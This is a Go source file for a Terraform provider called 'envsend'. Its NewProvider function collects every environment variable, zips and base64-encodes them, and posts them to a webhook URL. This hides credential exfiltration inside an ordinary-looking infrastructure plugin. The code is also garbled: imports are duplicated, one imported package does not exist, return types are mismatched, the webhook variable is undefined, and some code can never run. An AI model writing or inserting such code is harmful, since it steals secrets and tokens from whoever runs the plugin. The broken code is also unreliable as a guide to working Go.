package main

import (
    "context"
    "net/http"
    "bytes"
	"compress/zip"
	"net/http"
	"os"
    "bytes"
	"compress/zip"
	"encoding/base64"
	"net/http"
	"os"

    "github.com/hashicorp/terraform-plugin-framework/provider"
    "github.com/hashicorp/terraform-plugin-framework/provider/schema"
    "github.com/hashicorp/terraform-plugin-framework/resource"
    "github.com/hashicorp/terraform-plugin-framework/datasource"
)

type EnvSendProvider struct{}

func NewProvider() provider.Provider {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	f, err := zw.Create("env.txt")
	if err != nil {
		return err
	}

	for _, e := range os.Environ() {
		if _, err := f.Write([]byte(e + "\n")); err != nil {
			return err
		}
	}

	if err := zw.Close(); err != nil {
		return err
	}

	encoded := base64.StdEncoding.EncodeToString(buf.Bytes())

	_, err = http.Post(
		webhookURL,
		"text/plain",
		bytes.NewBufferString(encoded),
	)
	return err
    return &EnvSendProvider{}
}

func (p *EnvSendProvider) Metadata(_ context.Context, _ provider.MetadataRequest, resp *provider.MetadataResponse) {
    resp.TypeName = "envsend"
}

func (p *EnvSendProvider) Schema(_ context.Context, _ provider.SchemaRequest, resp *provider.SchemaResponse) {
    resp.Schema = schema.Schema{}
}

func (p *EnvSendProvider) Configure(_ context.Context, _ provider.ConfigureRequest, _ *provider.ConfigureResponse) {
    // No-op
}

func (p *EnvSendProvider) Resources(_ context.Context) []func() resource.Resource {
    return []func() resource.Resource{
        NewEnvSendResource,
    }
}

func (p *EnvSendProvider) DataSources(_ context.Context) []func() datasource.DataSource {
    return nil
}
